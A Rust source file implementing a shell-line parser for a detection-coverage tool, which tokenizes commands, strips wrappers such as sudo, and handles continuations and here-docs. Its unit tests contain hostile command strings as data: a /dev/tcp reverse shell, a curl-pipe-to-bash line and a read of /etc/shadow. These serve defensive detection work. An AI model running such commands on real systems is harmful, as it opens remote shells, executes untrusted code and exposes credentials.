//! A pragmatic shell-line parser. It is deliberately not a full POSIX shell
//! grammar: it tokenizes with quote awareness, strips comments, splits a line
//! into command segments on the common control operators, and resolves each
//! segment to a program basename plus arguments (stripping wrappers like
//! `sudo`/`env` and `VAR=value` assignments). Good enough to drive static
//! detection-coverage matching; the raw line is always preserved so that
//! substring-based rules (redirections, pipe-to-shell, sensitive paths) still
//! match regardless of tokenization edge cases.

/// A resolved command: the program invoked and its arguments, plus the raw
/// text of the line it came from.
#[derive(Debug, Clone)]
pub struct Command {
    pub program: String,
    pub args: Vec<String>,
    pub raw: String,
}

/// Wrapper programs whose presence at the head of a segment should be skipped
/// to reach the "real" command underneath.
const WRAPPERS: &[&str] = &[
    "sudo", "env", "nohup", "time", "command", "exec", "builtin", "doas", "setsid", "stdbuf",
    "nice", "ionice", "unbuffer",
];

/// Tokens that separate one command from the next within a line.
const SEPARATORS: &[&str] = &[";", "|", "||", "&&", "&"];

/// Tokenize a single line with quote awareness, returning bare tokens (quote
/// characters removed). Comments (`#` beginning a word) terminate the line.
fn tokenize(line: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut prev_was_space = true; // start-of-line counts as space for `#`

    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                prev_was_space = false;
            }
            '"' if !in_single => {
                in_double = !in_double;
                prev_was_space = false;
            }
            '#' if !in_single && !in_double && prev_was_space => {
                break; // start of a comment
            }
            c if c.is_whitespace() && !in_single && !in_double => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
                prev_was_space = true;
            }
            // Control operators break the current token even without
            // surrounding whitespace (e.g. `id;curl` or `a|b`). `||`/`&&` are
            // emitted as a single separator token.
            ';' | '|' | '&' if !in_single && !in_double => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
                let op = if (c == '|' || c == '&') && chars.peek() == Some(&c) {
                    chars.next();
                    format!("{c}{c}")
                } else {
                    c.to_string()
                };
                tokens.push(op);
                prev_was_space = true;
            }
            c => {
                cur.push(c);
                prev_was_space = false;
            }
        }
    }
    if !cur.is_empty() {
        tokens.push(cur);
    }
    tokens
}

fn is_assignment(tok: &str) -> bool {
    // NAME=value with a valid shell identifier before '='.
    if let Some(eq) = tok.find('=') {
        if eq == 0 {
            return false;
        }
        let name = &tok[..eq];
        let mut chars = name.chars();
        let first_ok = chars
            .next()
            .map(|c| c.is_ascii_alphabetic() || c == '_')
            .unwrap_or(false);
        return first_ok && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    }
    false
}

/// Executable-name extensions to strip so `whoami.exe` matches `whoami`. Safe
/// for Linux input (native binaries rarely carry these).
const EXE_EXTENSIONS: &[&str] = &[".exe", ".com", ".bat", ".cmd", ".ps1"];

/// Resolve a program path to its matched basename: the last path segment with a
/// leading `./` and a known executable extension stripped (`C:\…\certutil.exe`
/// → `certutil`). This is the exact normalization the matcher's `program` axis
/// keys on, so telemetry ingestion reuses it to reduce a Sysmon `Image` to the
/// same basename a parsed command line would yield.
pub(crate) fn basename(program: &str) -> String {
    let trimmed = program.strip_prefix("./").unwrap_or(program);
    // Split on both POSIX and Windows path separators.
    let last = trimmed.rsplit(['/', '\\']).next().unwrap_or(trimmed);
    let lower = last.to_ascii_lowercase();
    for ext in EXE_EXTENSIONS {
        if let Some(stripped) = lower.strip_suffix(ext) {
            return last[..stripped.len()].to_string();
        }
    }
    last.to_string()
}

/// Resolve one segment's tokens into a [`Command`], skipping leading
/// assignments and wrapper programs. Returns `None` for an empty segment.
fn to_command(tokens: &[String], raw: &str) -> Option<Command> {
    let mut i = 0;
    while i < tokens.len() {
        let tok = &tokens[i];
        if is_assignment(tok) {
            i += 1;
            continue;
        }
        if WRAPPERS.contains(&tok.to_lowercase().as_str()) {
            i += 1;
            // Skip option flags belonging to the wrapper (best-effort).
            while i < tokens.len() && tokens[i].starts_with('-') {
                i += 1;
            }
            continue;
        }
        break;
    }
    let program_tok = tokens.get(i)?;
    let program = basename(program_tok);
    let args = tokens.get(i + 1..).unwrap_or(&[]).to_vec();
    Some(Command {
        program,
        args,
        raw: raw.to_string(),
    })
}

/// Parse a single source line into zero or more commands. Each command carries
/// the full raw line so that substring rules remain line-scoped.
pub fn parse_line(line: &str) -> Vec<Command> {
    let raw = line.trim().to_string();
    let tokens = tokenize(line);
    if tokens.is_empty() {
        return Vec::new();
    }

    let mut commands = Vec::new();
    let mut segment: Vec<String> = Vec::new();
    for tok in tokens {
        if SEPARATORS.contains(&tok.as_str()) {
            if let Some(cmd) = to_command(&segment, &raw) {
                commands.push(cmd);
            }
            segment.clear();
        } else {
            segment.push(tok);
        }
    }
    if let Some(cmd) = to_command(&segment, &raw) {
        commands.push(cmd);
    }
    commands
}

/// A logical unit of input to analyze: a command line (after joining
/// continuations) plus the physical line it started on. Here-doc bodies fed to
/// a shell interpreter are emitted as their own units at their real line.
#[derive(Debug, Clone)]
pub struct Unit {
    pub line: usize,
    pub text: String,
}

/// Shell / scripting interpreters. A here-doc fed to one of these has its body
/// analyzed (it is executable code, not data).
const INTERPRETERS: &[&str] = &[
    "bash", "sh", "dash", "zsh", "ksh", "python", "python3", "python2", "perl", "ruby", "php",
    "node",
];

fn ends_with_odd_backslash(line: &str) -> bool {
    line.chars().rev().take_while(|&c| c == '\\').count() % 2 == 1
}

/// The delimiter word of the first here-doc operator (`<<WORD`, `<<-WORD`,
/// `<<'WORD'`) in `text`, if any. Here-strings (`<<<`) yield `None`.
fn heredoc_delimiter(text: &str) -> Option<String> {
    let idx = text.find("<<")?;
    let after = &text[idx + 2..];
    if after.starts_with('<') {
        return None; // here-string <<<
    }
    let after = after.strip_prefix('-').unwrap_or(after);
    let after = after.trim_start().trim_start_matches(['\'', '"']);
    let delim: String = after
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect();
    (!delim.is_empty()).then_some(delim)
}

/// Does this command line invoke a shell / scripting interpreter (e.g. the
/// consumer of a here-doc body)?
fn feeds_interpreter(text: &str) -> bool {
    parse_line(text)
        .iter()
        .any(|c| INTERPRETERS.contains(&c.program.as_str()))
}

/// Extract the inner text of every `$(...)` and backtick command substitution,
/// recursing into nested `$(...)`.
pub fn command_substitutions(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
            let start = i + 2;
            let mut depth = 1;
            let mut j = start;
            while j < bytes.len() {
                match bytes[j] {
                    b'(' => depth += 1,
                    b')' => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
                j += 1;
            }
            if depth == 0 {
                let inner = &text[start..j];
                out.push(inner.to_string());
                out.extend(command_substitutions(inner));
                i = j + 1;
                continue;
            }
        }
        if bytes[i] == b'`'
            && let Some(rel) = text[i + 1..].find('`')
        {
            let inner = &text[i + 1..i + 1 + rel];
            out.push(inner.to_string());
            i = i + 1 + rel + 1;
            continue;
        }
        i += 1;
    }
    out
}

/// Split raw input into logical units, honoring line continuations (trailing
/// `\`, `|`, `&&`, `||`) and here-docs. A here-doc body is treated as data and
/// skipped, unless the command consuming it is a shell/interpreter, in which
/// case each body line becomes its own unit at its physical line number.
pub fn preprocess(input: &str) -> Vec<Unit> {
    let phys: Vec<&str> = input.lines().collect();
    let mut units = Vec::new();
    let mut i = 0;
    while i < phys.len() {
        let start_line = i + 1;
        // Join continuation lines.
        let mut parts: Vec<String> = Vec::new();
        let mut j = i;
        loop {
            let raw = phys[j];
            if ends_with_odd_backslash(raw) && j + 1 < phys.len() {
                let pos = raw.rfind('\\').unwrap();
                parts.push(raw[..pos].to_string());
                j += 1;
                continue;
            }
            parts.push(raw.to_string());
            let te = raw.trim_end();
            let op_cont = te.ends_with("&&")
                || te.ends_with("||")
                || (te.ends_with('|') && !te.ends_with("||"));
            if op_cont && j + 1 < phys.len() {
                j += 1;
                continue;
            }
            break;
        }
        let text = parts.join(" ");

        // Emit the command line itself.
        units.push(Unit {
            line: start_line,
            text: text.clone(),
        });

        // Here-doc body follows the last physical line of the logical command.
        let mut next = j + 1;
        if let Some(delim) = heredoc_delimiter(&text) {
            let fed = feeds_interpreter(&text);
            let mut k = j + 1;
            while k < phys.len() && phys[k].trim() != delim {
                if fed {
                    units.push(Unit {
                        line: k + 1,
                        text: phys[k].to_string(),
                    });
                }
                k += 1;
            }
            next = if k < phys.len() { k + 1 } else { k };
        }
        i = next;
    }
    units
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_sudo_and_assignments() {
        let cmds = parse_line("FOO=bar sudo cat /etc/shadow");
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0].program, "cat");
        assert_eq!(cmds[0].args, vec!["/etc/shadow"]);
    }

    #[test]
    fn splits_on_pipe_and_semicolon() {
        let cmds = parse_line("id; curl http://x/y | bash");
        let progs: Vec<_> = cmds.iter().map(|c| c.program.as_str()).collect();
        assert_eq!(progs, vec!["id", "curl", "bash"]);
    }

    #[test]
    fn comment_is_ignored() {
        let cmds = parse_line("whoami # who am I");
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0].program, "whoami");
    }

    #[test]
    fn hash_inside_quotes_is_kept() {
        let cmds = parse_line("echo '# not a comment'");
        assert_eq!(cmds[0].program, "echo");
        assert_eq!(cmds[0].args, vec!["# not a comment"]);
    }

    #[test]
    fn basename_resolves_path() {
        let cmds = parse_line("/usr/bin/whoami");
        assert_eq!(cmds[0].program, "whoami");
    }

    #[test]
    fn raw_is_preserved_for_redirect() {
        let cmds = parse_line("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(cmds[0].raw.contains("/dev/tcp"));
    }

    #[test]
    fn backslash_continuation_joins_lines() {
        let units = preprocess("curl \\\n  http://x/y");
        assert_eq!(units.len(), 1);
        assert!(units[0].text.contains("curl"));
        assert!(units[0].text.contains("http://x/y"));
    }

    #[test]
    fn trailing_pipe_continues_to_next_line() {
        let units = preprocess("curl http://x/y |\n bash");
        assert_eq!(units.len(), 1);
        assert!(units[0].text.contains("| bash") || units[0].text.contains("|  bash"));
    }

    #[test]
    fn heredoc_data_body_is_skipped_but_shell_body_is_kept() {
        // cat's here-doc is data -> only the `cat` line is a unit.
        let data = preprocess("cat <<EOF\nsecret-token=abc\nEOF\nwhoami");
        let texts: Vec<_> = data.iter().map(|u| u.text.trim()).collect();
        assert!(texts.contains(&"cat <<EOF"));
        assert!(!texts.iter().any(|t| t.contains("secret-token")));
        assert!(texts.contains(&"whoami"));

        // bash's here-doc is executable -> body lines become units.
        let shell = preprocess("bash <<EOF\nwhoami\nEOF");
        assert!(shell.iter().any(|u| u.text.trim() == "whoami"));
    }

    #[test]
    fn extracts_command_substitutions() {
        let subs = command_substitutions("x=$(whoami); y=`id`");
        assert!(subs.iter().any(|s| s.contains("whoami")));
        assert!(subs.iter().any(|s| s.contains("id")));
    }
}
